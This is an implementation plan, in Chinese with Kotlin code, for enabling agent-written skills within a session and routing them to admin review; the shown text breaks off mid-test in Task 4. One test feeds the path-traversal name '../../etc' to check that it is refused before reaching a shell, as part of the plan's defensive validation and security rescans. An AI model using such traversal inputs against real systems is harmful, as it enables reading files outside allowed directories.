# 自写技能会话内可用与审核上升 · 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 让 agent 自写的技能在提议它的那个会话里先能用（一次人工确认），再经既有审核队列上升为平台技能。

**Architecture:** 容器内新增一棵 `harnax-skill-staging/session-enabled/` 作为「本会话可用区」，由一枚新的 `RuntimeContextSkillRepository` 在每次 call 重算目录册时装进 Layer 2（名次低于 Admin 交付）；启用动作在 call 外经 `KeepAliveSandboxManager` 的容器句柄执行一次容器内 `cp -R`；答完之后的上报那一跳改为「句柄读盘 + 上游扫描器 + Admin intake」直连，不再借 `promoteSkill` 走 gate。零新表、零新服务。

**Tech Stack:** Kotlin 2.2.20 / Spring Boot 4 / MyBatis / Reactor；agentscope 2.0.4（`io.agentscope.harness.agent.*`）；React + UmiJS `max` + antd（webui）；SwiftUI + SPM（harnax-ios）。

**规格：** `docs/superpowers/specs/2026-10-08-session-skill-lifecycle-design.md`（决策 D1–D12 与接口契约以它为准，本计划只拆任务不改裁定）。

## Global Constraints

- 基线（本 worktree 实测）：harness-core **662** 例（1 skipped）、admin **2430** 例、12 模块合计 **3645** 例，`BUILD SUCCESS`。任何任务收尾都要能重跑且不新增失败。
- harness-core 实到数：Task 1 +2 = 664，Task 2 +3 = 667（`42d10261`），Task 3 +2 = 669（`9285688e`），Task 2 修复轮 +3 = 672（`dc2cfeee`，1 skipped），Task 4 +6 = **678**（`edc11e02`）。Task 4 的复审补强那笔（Step 6）再加 4 支 = 682。后面的任务按「678（或补强后 682）+ 自己新增」核，不要拿 662/664/667 当基线。
- **每个任务结束时它自己的 HEAD 必须能编译、模块门禁必须能跑。** 谁改了一个签名，谁就在同一个任务里把所有调用点一起改掉——不许留「下一个任务会修」的编译失败。（计划里 Task 6/7 的中间件装配就是按这条重新切开的：Task 6 只把安装点搬到 launcher 并沿用旧构造，Task 7 换构造并跟着改那一行调用。）
- 代码注释、KDoc、日志字符串一律英文；面向用户的界面文案走 i18n（webui `pages.session.*`，iOS `chat.*`），中英两份同步。
- Maven 用全局路径 `/Users/heqingsong/software/apache-maven-3.9.12/bin/mvn`，`JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home`；`-am` 必带；`-pl` 对 agent 子模块要写路径形（`harnax-agent/harnax-harness-core`）；spotless 绑在 compile 上，改过 Kotlin 先 `mvn -q spotless:apply -pl <module>`（不带 `-am`）。单跑 `-Dtest=X` 时 `-am` 要配 `-Dsurefire.failIfNoSpecifiedTests=false`，否则上游模块会以「no tests matching pattern」先把 reactor 打断。
- 计数从聚合行 `awk` 求和，禁止 `grep FAIL`（会命中 `AUTH_FAILED`）。
- webui 闸门只有 `max build` + 逐文件 biome lint + 本任务测试文件的 jest；**严禁 `biome check --write`**（会铺 1600+ 行无关改动）。
- `npx tsc --noEmit` **不是可用闸门**：2026-10-08 在 `feat/session-skill-lifecycle` 上实测 exit 2 / 480 条，其中 273 条 TS2307（全仓 `@/` 别名在裸 tsc 下不解析）、146 条 TS2305（`@umijs/max` 的 `request`/`useIntl` 等再导出类型缺失），新建文件必然再吃这两类；类型接线以 `max build` 通过为准。
- 跑 webui 的 jest 要带 `NODE_OPTIONS=--no-experimental-strip-types TS_NODE_PROJECT=../harnax-ui-test/tsconfig.json`：`jest.config.ts` 在 Node 22 下加载即死（`@umijs/max/test` 只给 `.js`，且 `tsconfig.json` 的 `"watch": true` 被 ts-node 判 TS6266）。
- iOS 闸门 `swift build --build-tests` 与 `swift test`，**每次换新的 `--scratch-path`**；`ToolbarItem` 在 macOS 测试宿主只接受 `.primaryAction`；新增可见屏要在 `App/HarnaxDebugScreens.swift` 补一个 `-FIXTURE` case。
- 不新增表、不新增服务、不改 `promoted/` 语义、不碰 `skill` / `agent_skill_binding` / `SandboxSkillProjector`。
- **不在 nginx 里开 `/api/agent/` location**。浏览器与 iOS 只经 `harnax-session-router` 的 `/api/router/agent/**`；agent-service 侧靠 `@InternalOnly` 注解守。
- 上游引用一律写成 `ClassName:line`（jar 不在仓内，取证件在 `harnax-agent/tmp/asrc-1008/`，该目录 git-ignored 且只在主检出，不在本 worktree）。
- 合并只回 `kotlin-dev` 本地，**不 push**。

## 文件结构

`harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/`

| 文件 | 动作 | 职责 |
|---|---|---|
| `skill/SkillDraftStaging.kt` | 改 | 加 `SESSION_ENABLED_DIR`，并把三个暂存目录收进一条 `STAGING_DIRS` 让启动期断言覆盖到它 |
| `skill/SkillDraftFilesReader.kt` | 改 | `WorkspaceDraftFilesReader` 加 `readSkillMarkdown()`：只取 `SKILL.md` 的正文与 mtime（启用与目录册都要正文，今天的 `read()` 只回四个支持目录） |
| `skill/SessionSkillStore.kt` | 新建 | call 外唯一出入口：`filesystemFor(sessionId)`、`listDrafts`、`readDraft`、`listEnabled`、`enable`；带 `EnableOutcome` 与 `SessionDraft` |
| `skill/SessionEnabledSkillRepository.kt` | 新建 | Layer 2 的会话可用区仓库，`RuntimeContextSkillRepository`，晚绑定同 `SkillDraftStaging` |
| `skill/SkillDraftSubmitMiddleware.kt` | 改 | 上报改走 store（D6），构造参数换成 `sessionId + store + adaptor` |
| `skill/AdminBackedPromotionGate.kt` | 改 | 只把私有 `describe` 换成共享的 `findingTexts`，gate 角色不变 |
| `HarnessAgentBuilder.kt` | 改 | `skillSelfWrite` 多收 `sessionSkills`；`build()` 里在 in-memory 之前注册可用区仓库，build 后 `bind` |
| `HarnessAgentLauncher.kt` | 改 | 装配点创建 `SessionSkillStore`/`SessionEnabledSkillRepository`，把中间件改到 launcher 安装 |

`harnax-agent/harnax-agent-service/.../controller/SessionSkillController.kt` 新建（两条内部端点）。
`harnax-session-router`：`AgentServiceClient.kt` / `proxy/SessionRouterService.kt` / `controller/AgentProxyController.kt` 各加两条。
`harnax-admin`：`SkillDraftService.kt` / `impl/SkillDraftServiceImpl.kt` / `SkillDraftController.kt` 各加一个 `sessionId` 形参（SQL 与 mapper 已就绪）。
`harnax-webui`：`services/ant-design-pro/sessionSkill.ts`、`pages/session/components/SessionSkillsDrawer.tsx` 新建；`typings.d.ts`、`pages/session/index.tsx`、两份 `locales/*/pages.ts` 改。
`harnax-ios`：`HarnaxCore/Contract/SessionSkill.swift`、`HarnaxAPI/SessionSkillEndpoint.swift`、`HarnaxAPI/SessionSkillClient.swift`、`HarnaxFeatures/Chat/SessionSkillsSheet.swift`、`HarnaxFeatures/Chat/SessionSkillsViewModel.swift` 新建；`ChatView.swift`、`ChatViewModel.swift`、`Support/HarnaxDependencies.swift`、两份 `Localizable.strings`、`App/HarnaxDebugScreens.swift` 改。

---

## Task 1: 可用区目录常量与启动期断言覆盖面

**Files:**
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftStaging.kt:87-108`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SkillDraftStagingTest.kt`

**Interfaces:**
- Produces: `SkillDraftStaging.SESSION_ENABLED_DIR: String`（= `"harnax-skill-staging/session-enabled"`）、`SkillDraftStaging.STAGING_DIRS: List<String>`、`internal fun dirClashesWithSkillsDir(String): Boolean`

- [ ] **Step 1: 写失败测试**

在 `SkillDraftStagingTest.kt` 追加：

```kotlin
@Test
fun `the session-enabled directory is one of the staged directories the guard covers`() {
    assertEquals(
        listOf(
            SkillDraftStaging.DRAFTS_DIR,
            SkillDraftStaging.PROMOTED_DIR,
            SkillDraftStaging.SESSION_ENABLED_DIR,
        ),
        SkillDraftStaging.STAGING_DIRS,
    )
    assertEquals("harnax-skill-staging/session-enabled", SkillDraftStaging.SESSION_ENABLED_DIR)
    SkillDraftStaging.STAGING_DIRS.forEach {
        assertFalse(dirClashesWithSkillsDir(it), "'$it' would land inside the delivered-skills directory")
    }
}

@Test
fun `the guard's own rule still rejects a directory under the delivered skills`() {
    assertTrue(dirClashesWithSkillsDir("skills/session-enabled"))
    assertTrue(dirClashesWithSkillsDir("skills"))
    assertFalse(dirClashesWithSkillsDir("harnax-skill-staging/session-enabled/inner"))
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home /Users/heqingsong/software/apache-maven-3.9.12/bin/mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SkillDraftStagingTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败，`unresolved reference: SESSION_ENABLED_DIR`

- [ ] **Step 3: 改 `SkillDraftStaging` 的 companion**

把 `:87-108` 的常量块换成（`clashesWithTheSkillsDir` 从 `private fun String.` 提成文件级 `internal fun`，这样守卫的规则本身可测）：

```kotlin
const val STAGING_ROOT = "harnax-skill-staging"

const val DRAFTS_DIR = "$STAGING_ROOT/_drafts"

const val PROMOTED_DIR = "$STAGING_ROOT/promoted"

/**
 * Where a skill the operator confirmed for *this session* is copied to, so the model can use it on its
 * next call. Not upstream's [PROMOTED_DIR]: the harness appends the writable repository it builds for
 * promotion at the end of the repository list, which is the winning position on a name clash, so a
 * directory loaded from there would shadow every skill Admin delivered.
 */
const val SESSION_ENABLED_DIR = "$STAGING_ROOT/session-enabled"

/** Everything the guard below has to keep out of the delivered-skills tree. */
val STAGING_DIRS = listOf(DRAFTS_DIR, PROMOTED_DIR, SESSION_ENABLED_DIR)

init {
    // The directories above are compile-time constants, so this can only fire once someone edits
    // them — which is the point: it runs on class load, before any agent is assembled and before
    // anything has been written where a model could read it.
    val clash = STAGING_DIRS.firstOrNull { dirClashesWithSkillsDir(it) }
    require(clash == null) {
        "Skill staging directory '$clash' overlaps '" + SandboxSkillProjector.SKILLS_DIR +
            "', the directory Admin's delivered skills are projected into; staged drafts would " +
            "become a load source the model reads"
    }
}
```

并在文件末尾（类外）加：

```kotlin
/** Whether [dir] sits inside [SandboxSkillProjector.SKILLS_DIR], in either direction. */
internal fun dirClashesWithSkillsDir(dir: String): Boolean {
    val skills = SandboxSkillProjector.SKILLS_DIR
    return dir == skills || dir.startsWith("$skills/") || skills.startsWith("$dir/")
}
```

- [ ] **Step 4: 格式化后跑测试确认通过**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SkillDraftStagingTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: `Tests run: <n>, Failures: 0, Errors: 0`

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftStaging.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SkillDraftStagingTest.kt
git commit -m "feat(skill): 会话可用区目录常量入暂存目录断言清单——新目录不再可能落进交付技能树"
```

---

## Task 2: 读回 `SKILL.md` 正文与 mtime

**Files:**
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftFilesReader.kt:72-112`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/WorkspaceDraftFilesReaderTest.kt`

**Interfaces:**
- Consumes: `Task 1` 的 `SESSION_ENABLED_DIR`
- Produces: `WorkspaceDraftFilesReader.readSkillMarkdown(skillName: String, ctx: RuntimeContext?): DraftMarkdown?`、`data class DraftMarkdown(val content: String, val modifiedAt: String?)`

- [ ] **Step 1: 写失败测试**

追加到 `WorkspaceDraftFilesReaderTest.kt`（沿用该文件已有的 `filesystem` mock 与 `ctx`）：

```kotlin
@Test
fun `the draft's own SKILL.md comes back with the timestamp the listing gave it`() {
    `when`(filesystem.read(any(), eq("$DRAFTS/invoice-fill/SKILL.md"), anyInt(), anyInt())).thenReturn(
        ReadResult.success(FileData("---\nname: invoice-fill\ndescription: fills\n---\nbody\n", "utf-8")),
    )
    val md = reader().readSkillMarkdown("invoice-fill", ctx)
    assertNotNull(md)
    assertEquals("body", md!!.content.trimEnd().substringAfter("\n---\n"))
}

@Test
fun `a draft with no readable SKILL.md reads as no markdown rather than an empty one`() {
    `when`(filesystem.read(any(), anyString(), anyInt(), anyInt()))
        .thenReturn(ReadResult.fail("no such file"))
    assertNull(reader().readSkillMarkdown("invoice-fill", ctx))
}

@Test
fun `the same reader pointed at the enabled directory reads the enabled copy`() {
    val enabled = WorkspaceDraftFilesReader(filesystem, SkillDraftStaging.SESSION_ENABLED_DIR)
    `when`(filesystem.read(any(), eq("${SkillDraftStaging.SESSION_ENABLED_DIR}/invoice-fill/SKILL.md"), anyInt(), anyInt()))
        .thenReturn(ReadResult.success(FileData("---\nname: invoice-fill\ndescription: fills\n---\nbody\n", "utf-8")))
    assertNotNull(enabled.readSkillMarkdown("invoice-fill", ctx))
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=WorkspaceDraftFilesReaderTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败，`unresolved reference: readSkillMarkdown`

- [ ] **Step 3: 实现**

在 `SkillDraftFilesReader.kt` 顶部 import 之后加数据类，并在 `WorkspaceDraftFilesReader` 内 `read()` 之后加方法：

```kotlin
/** One draft's skill text and the moment its directory was written, which is what "enabled at" reports. */
data class DraftMarkdown(val content: String, val modifiedAt: String?)
```

```kotlin
/**
 * The draft's own `SKILL.md`, which [read] deliberately leaves out: it returns only the support files the
 * review queue stores, while a skill has to be parsed from the text and a session's enabled list has to
 * say when the copy was made.
 *
 * Null when there is nothing to read. A directory without a `SKILL.md` is not a skill by upstream's own
 * discovery rule, so callers treat the absence as "no such draft" instead of inventing an empty skill.
 */
fun readSkillMarkdown(
    skillName: String,
    ctx: RuntimeContext?,
): DraftMarkdown? {
    val path = "$draftsDir/$skillName/$SKILL_FILE"
    return try {
        val read = filesystem.read(ctx ?: RuntimeContext.empty(), path, 0, 0)
        if (!read.isSuccess) return null
        val data = read.fileData() ?: return null
        val content = data.content ?: return null
        DraftMarkdown(content, data.modifiedAt)
    } catch (e: Exception) {
        log.warn("Could not read {} of draft {}: {}", path, skillName, e.message)
        null
    }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=WorkspaceDraftFilesReaderTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: `Failures: 0, Errors: 0`

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SkillDraftFilesReader.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/WorkspaceDraftFilesReaderTest.kt
git commit -m "feat(skill): 草稿读回补 SKILL.md 正文与 mtime——可用区解析与启用时间都取这一份"
```

---

## Task 3: `SessionSkillStore`——call 外的容器出入口

**Files:**
- Create: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStore.kt`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStoreTest.kt`

**Interfaces:**
- Consumes: `SkillDraftStaging.DRAFTS_DIR` / `SESSION_ENABLED_DIR`、`WorkspaceDraftFilesReader`
- Produces:
  - `fun interface SandboxHandleProvider { fun handle(sessionId: String): Sandbox? }`
  - `data class SessionDraft(val name: String, val description: String?, val skillmd: String, val resources: Map<String, String>)`
  - `data class EnabledSkill(val name: String, val description: String?, val enabledAt: String?)`
  - `sealed class EnableOutcome` → `Enabled(name, verdict, findings: Int)` / `NoSandbox` / `SourceMissing` / `Blocked(verdict, findings: List<String>)` / `Full(count: Int)` / `Failed(reason: String)`
  - `SessionSkillStore.filesystemFor(sessionId): AbstractFilesystem?`
  - `SessionSkillStore.listDraftNames(sessionId): List<String>`
  - `SessionSkillStore.readDraft(sessionId, name): SessionDraft?`
  - `SessionSkillStore.listEnabled(sessionId): List<EnabledSkill>`
  - `SessionSkillStore.enable(sessionId, name): EnableOutcome`
  - `internal fun findingTexts(findings: List<SkillSecurityScanner.Finding>): List<String>`

- [ ] **Step 1: 写失败测试（只测句柄出入口的两支安静形状）**

Task 3 只测**不经过工作区文件系统**的路径：容器不在、名字过不了 `safeRelativePath`。凡是走到 `readDraft` / `listEnabledNames` 的用例都依赖 pin 出来的文件系统，那枚注入缝在 Task 4 才加，所以「复制失败」那支排到 Task 4，不要在这里造一个实现根本不会执行的 `ls -1`。

```kotlin
package com.agnetix.harnax.harness.skill

import io.agentscope.harness.agent.sandbox.ExecResult
import io.agentscope.harness.agent.sandbox.Sandbox
import io.agentscope.harness.agent.sandbox.impl.docker.DockerSandbox
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.mockito.Mockito

class SessionSkillStoreTest {

    private val root = "/workspace"

    private fun storeWith(handle: Sandbox?): SessionSkillStore =
        SessionSkillStore(SandboxHandleProvider { handle }, root)

    @Test
    fun `a session whose container is gone answers nothing and does not throw`() {
        val store = storeWith(null)
        assertNull(store.filesystemFor("chn-1"))
        assertTrue(store.listDraftNames("chn-1").isEmpty())
        assertTrue(store.listEnabled("chn-1").isEmpty())
        assertEquals(EnableOutcome.NoSandbox, store.enable("chn-1", "invoice-fill"))
    }

    @Test
    fun `a name that is not a relative path is refused before it reaches a shell`() {
        val sandbox = Mockito.mock(DockerSandbox::class.java)
        Mockito.`when`(sandbox.exec(Mockito.isNull(), Mockito.anyString(), Mockito.anyInt()))
            .thenReturn(ExecResult(0, "", "", false))
        val outcome = storeWith(sandbox).enable("ses-1", "../../etc")
        assertTrue(outcome is EnableOutcome.SourceMissing, "got $outcome")
        Mockito.verifyNoInteractions(sandbox)
    }
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SessionSkillStoreTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: 编译失败，`unresolved reference: SessionSkillStore`

- [ ] **Step 3: 实现 `SessionSkillStore.kt`**

关键事实（都已取证，写代码时照此，不要另起炉灶）：
`Sandbox` 上**没有**任何文件方法，唯一通道是 `exec(RuntimeContext?, String, Integer)`，且 `runtimeContext` 允许为 null（`Sandbox.java:67` javadoc、`DockerSandbox.java:145` 方法体一次都没读它）；`ExecResult` 是 record，取字段用 `exitCode()/stdout()/stderr()/truncated()`，`ok()` 判 `exitCode == 0`；call 外要一个 `AbstractFilesystem` 就包 `PinnedSandboxFilesystem(sandbox)`（专为此场景设计）。列目录/读正文复用 `WorkspaceDraftFilesReader`，路径一律相对 workspace root。

```kotlin
package com.agnetix.harnax.harness.skill

import com.agnetix.harnax.harness.sandbox.SandboxFileWriter
import io.agentscope.harness.agent.filesystem.AbstractFilesystem
import io.agentscope.harness.agent.filesystem.sandbox.PinnedSandboxFilesystem
import io.agentscope.harness.agent.sandbox.ExecResult
import io.agentscope.harness.agent.sandbox.Sandbox
import io.agentscope.harness.agent.skill.curator.SkillSecurityScanner
import org.slf4j.LoggerFactory
import java.util.concurrent.TimeUnit

/**
 * The out-of-call door onto one session's container: what a session has drafted, what it has enabled, and
 * the copy that makes a draft usable.
 *
 * Out of call is the whole point. [Sandbox] exposes no file methods at all — only `exec(RuntimeContext, …)`,
 * whose context `may be null` (`Sandbox.java:67`), and the docker implementation never reads that argument
 * (`DockerSandbox.java:145-201` runs `docker exec -w <root> <container> sh -c …`). So this holds a live
 * container handle rather than the agent's workspace filesystem, which [SkillDraftStaging] can only reach
 * after the agent exists: an operator enabling a skill over HTTP has no agent to bind to, and after a TTL
 * expiry or a restart there may be none left to bind to at all.
 *
 * Everything here is best-effort in the same shape as the draft reads: no container answers as empty, and
 * no exception is handed to a caller that can do nothing about a stopped sandbox.
 */
class SessionSkillStore(
    private val handles: SandboxHandleProvider,
    private val workspaceRoot: String,
    private val maxEnabled: Int = MAX_ENABLED,
    private val execTimeoutSeconds: Int = EXEC_TIMEOUT_SECONDS,
) {

    private val log = LoggerFactory.getLogger(SessionSkillStore::class.java)

    /** The same workspace filesystem the in-call reads use, pinned to this session's live container. */
    fun filesystemFor(sessionId: String): AbstractFilesystem? =
        handles.handle(sessionId)?.let { PinnedSandboxFilesystem(it) }

    private fun draftsReader(fs: AbstractFilesystem) =
        WorkspaceDraftFilesReader(fs, SkillDraftStaging.DRAFTS_DIR)

    private fun enabledReader(fs: AbstractFilesystem) =
        WorkspaceDraftFilesReader(fs, SkillDraftStaging.SESSION_ENABLED_DIR)

    fun listDraftNames(sessionId: String): List<String> {
        val fs = filesystemFor(sessionId) ?: return emptyList()
        return draftsReader(fs).listDraftSkillNames(null)
    }

    fun listEnabledNames(sessionId: String): List<String> {
        val fs = filesystemFor(sessionId) ?: return emptyList()
        return enabledReader(fs).listDraftSkillNames(null)
    }

    /**
     * One draft as the review queue and the enabling operator need it: text, support files, description.
     * Null when it cannot be read, which the caller reports as "no such draft".
     */
    fun readDraft(sessionId: String, name: String): SessionDraft? {
        val fs = filesystemFor(sessionId) ?: return null
        val md = draftsReader(fs).readSkillMarkdown(name, null) ?: return null
        val resources = draftsReader(fs).read(name, null)
        return SessionDraft(
            name = name,
            description = skillDescription(md.content) ?: name,
            skillmd = md.content,
            resources = resources,
        )
    }

    fun listEnabled(sessionId: String): List<EnabledSkill> {
        val fs = filesystemFor(sessionId) ?: return emptyList()
        val reader = enabledReader(fs)
        return reader.listDraftSkillNames(null).mapNotNull { name ->
            val md = reader.readSkillMarkdown(name, null) ?: return@mapNotNull null
            EnabledSkill(name = name, description = skillDescription(md.content) ?: name, enabledAt = md.modifiedAt)
        }
    }

    /**
     * Copies one draft into this session's enabled directory.
     *
     * A copy, not a move: what the reviewer later decides on is the draft in `_drafts`, and the session has
     * to keep working even after that directory is archived or overwritten by the next turn's rewrite. The
     * copy is byte-for-byte because it runs inside the container — `cp -R` never moves the bytes through this
     * process, which would mean base64 chunking for every file and a corrupted binary for anything in
     * `assets/`.
     *
     * The scan runs again here rather than trusting that the write-time scan already ran: `SkillManageTool`
     * does roll a DANGEROUS skill back, but this is the moment a human agrees to let the skill into a model's
     * system prompt, and the verdict they are agreeing with has to be the one computed from these bytes.
     */
    fun enable(sessionId: String, name: String): EnableOutcome {
        val sandbox = handles.handle(sessionId)
            ?: return EnableOutcome.NoSandbox
        // Names reach a shell. safeRelativePath is the repository's own gate for exactly that: it refuses
        // quotes, `$`, backticks, newlines and whitespace, so the single quotes below cannot be escaped.
        val safe = SandboxFileWriter.safeRelativePath(name) ?: return EnableOutcome.SourceMissing
        val drafts = "$workspaceRoot/${SkillDraftStaging.DRAFTS_DIR}/$safe"
        val target = "$workspaceRoot/${SkillDraftStaging.SESSION_ENABLED_DIR}/$safe"

        if (!exec(sandbox, "test -f '$drafts/$SKILL_FILE' && echo yes").contains("yes")) {
            return EnableOutcome.SourceMissing
        }
        val draft = readDraft(sessionId, safe) ?: return EnableOutcome.SourceMissing
        val scan = SkillSecurityScanner.scan(safe, draft.skillmd, draft.resources)
        if (!SkillSecurityScanner.shouldAllow(SkillSecurityScanner.TrustLevel.AGENT_CREATED, scan.verdict())) {
            log.warn("Draft {} of session {} is {} and cannot be enabled in the session", safe, sessionId, scan.verdict())
            return EnableOutcome.Blocked(scan.verdict().name, findingTexts(scan.findings()))
        }
        val enabled = listEnabledNames(sessionId)
        if (enabled.size >= maxEnabled && !enabled.contains(safe)) {
            return EnableOutcome.Full(enabled.size)
        }
        val copy = execRaw(
            sandbox,
            "mkdir -p '${enabledRoot(workspaceRoot)}' && rm -rf '$target' && " +
                "mkdir -p '$target' && cp -R '$drafts/.' '$target/'",
        )
        if (!copy.ok()) {
            log.warn("Could not enable draft {} for session {}: {}", safe, sessionId, copy.stderr())
            return EnableOutcome.Failed(copy.stderr().orEmpty().ifEmpty { "the container refused the copy" })
        }
        log.info("Draft {} enabled for session {} (verdict {}, {} findings)", safe, sessionId, scan.verdict(), scan.findings().size)
        return EnableOutcome.Enabled(safe, scan.verdict().name, scan.findings().size)
    }

    private fun exec(
        sandbox: Sandbox,
        command: String,
    ): String = execRaw(sandbox, command).stdout().orEmpty()

    private fun execRaw(
        sandbox: Sandbox,
        command: String,
    ): ExecResult = try {
        sandbox.exec(null, command, execTimeoutSeconds)
    } catch (e: Exception) {
        log.warn("Sandbox command failed for {}: {}", sandboxLabel(sandbox), e.message)
        ExecResult(1, "", e.message ?: e.javaClass.simpleName, false)
    }

    private fun sandboxLabel(sandbox: Sandbox): String = sandbox.javaClass.simpleName

    companion object {
        const val SKILL_FILE = "SKILL.md"

        /** Design D9: these all land in the system prompt of one session. */
        const val MAX_ENABLED = 10

        private const val EXEC_TIMEOUT_SECONDS = 15

        /** Parent directory of the enabled tree, for callers that need it in an absolute path. */
        fun enabledRoot(workspaceRoot: String): String = "$workspaceRoot/${SkillDraftStaging.SESSION_ENABLED_DIR}"
    }
}

/** How this store reaches a container: the keep-alive manager's handle, or a test's double. */
fun interface SandboxHandleProvider {
    fun handle(sessionId: String): Sandbox?
}

data class SessionDraft(
    val name: String,
    val description: String?,
    val skillmd: String,
    val resources: Map<String, String>,
)

data class EnabledSkill(val name: String, val description: String?, val enabledAt: String?)

sealed class EnableOutcome {

    data class Enabled(val name: String, val verdict: String, val findings: Int) : EnableOutcome()

    /** No live container: nothing to write into, and no reason to pretend the draft is gone. */
    data object NoSandbox : EnableOutcome()

    data object SourceMissing : EnableOutcome()

    data class Blocked(val verdict: String, val findings: List<String>) : EnableOutcome()

    data class Full(val count: Int) : EnableOutcome()

    /** The draft was fine and the copy was not: disk full, container died mid-command. */
    data class Failed(val reason: String) : EnableOutcome()
}

/**
 * The `description:` from a skill's YAML front matter, or null.
 *
 * Read by hand rather than through upstream's parser because the queue and the session panel have to show
 * something for a draft whose text is not yet a valid skill — the one case the parser refuses outright.
 */
internal fun skillDescription(markdown: String): String? {
    val lines = markdown.lines()
    if (lines.firstOrNull()?.trim() != "---") return null
    val end = lines.drop(1).indexOfFirst { it.trim() == "---" }
    if (end < 0) return null
    return lines.drop(1).take(end)
        .firstOrNull { it.startsWith("description:") }
        ?.substringAfter("description:")
        ?.trim()
        ?.trim('"', '\'')
        ?.takeIf { it.isNotEmpty() }
}

/** The finding strings Admin's queue column stores, shared with [AdminBackedPromotionGate]. */
internal fun findingTexts(findings: List<SkillSecurityScanner.Finding>): List<String> = findings.map {
    "${it.patternId()} [${it.severity()}/${it.category()}] ${it.file()}:${it.line()} ${it.description()}"
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `... mvn -q spotless:apply -pl harnax-agent/harnax-harness-core && ... mvn -o test -pl harnax-agent/harnax-harness-core -am -Dtest=SessionSkillStoreTest` -Dsurefire.failIfNoSpecifiedTests=false
Expected: `Failures: 0, Errors: 0`

- [ ] **Step 5: 提交**

```bash
git add harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStore.kt \
        harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStoreTest.kt
git commit -m "feat(skill): SessionSkillStore 立 call 外容器出入口——句柄读盘、复扫、容器内 cp -R 复制"
```

---

## Task 4: `enable` 的四支拒因与上限

**Files:**
- Modify: `harnax-agent/harnax-harness-core/src/main/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStore.kt`
- Test: `harnax-agent/harnax-harness-core/src/test/kotlin/com/agnetix/harnax/harness/skill/SessionSkillStoreEnableTest.kt`

**Interfaces:**
- Consumes: Task 3 的 `EnableOutcome`
- Produces: 同 Task 3，行为补齐

- [ ] **Step 1: 写失败测试**

```kotlin
package com.agnetix.harnax.harness.skill

import io.agentscope.harness.agent.filesystem.AbstractFilesystem
import io.agentscope.harness.agent.filesystem.model.FileData
import io.agentscope.harness.agent.filesystem.model.FileInfo
import io.agentscope.harness.agent.filesystem.model.GlobResult
import io.agentscope.harness.agent.filesystem.model.ReadResult
import io.agentscope.harness.agent.sandbox.ExecResult
import io.agentscope.harness.agent.sandbox.Sandbox
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.mockito.ArgumentMatchers.anyInt
import org.mockito.ArgumentMatchers.anyString
import org.mockito.Mockito
import org.mockito.kotlin.any
import org.mockito.kotlin.argumentCaptor
import org.mockito.kotlin.contains
import org.mockito.kotlin.eq
import org.mockito.kotlin.isNull

/**
 * The refusals an operator has to be able to tell apart, because the panel says one of them back and
 * a wrong one sends them to the wrong place: no draft to enable, a draft the scanner will not let in, a
 * session that has already filled its ten, and a container that refused the copy itself.
 */
class SessionSkillStoreEnableTest {

    private val sandbox = Mockito.mock(Sandbox::class.java)

    private val fs = Mockito.mock(AbstractFilesystem::class.java)

    /** What the copy has to read from, and must never delete. */
    private val draftsRoot = "/workspace/${SkillDraftStaging.DRAFTS_DIR}"

    private fun store(max: Int = 10) = SessionSkillStore(
        handles = SandboxHandleProvider { sandbox },
        workspaceRoot = "/workspace",
        maxEnabled = max,
        pinnedFilesystem = { fs },
    )

    private fun stubDraftExists(name: String) {
        Mockito.`when`(sandbox.exec(isNull(), contains("test -f"), anyInt()))
            .thenReturn(ExecResult(0, "yes\n", "", false))
        // Widest stubs first: Mockito resolves a call that matches several stubbings to the last one declared.
        Mockito.`when`(fs.glob(any(), anyString(), anyString())).thenReturn(GlobResult.fail("none"))
